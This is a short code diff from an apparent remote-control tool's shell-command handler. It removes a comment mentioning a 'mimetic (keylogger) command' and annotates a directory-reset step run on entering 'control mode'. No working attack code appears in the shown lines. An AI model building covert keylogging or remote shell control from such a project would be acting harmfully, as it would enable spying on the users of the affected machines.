@@ -725,9 +725,10 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle mimetic (keylogger) command
         # Handle reset directory command (called when entering control mode)
         if cmd_lower.startswith("__reset_dir__"):
+            # ⚠️ USES global current_working_dir (declared at function start)
+            # INCIDENT: v0.1.59 bug - wasn't resetting directory on control mode entry
             try:
                 current_working_dir = 'C:\\Users'
                 os.chdir(current_working_dir)
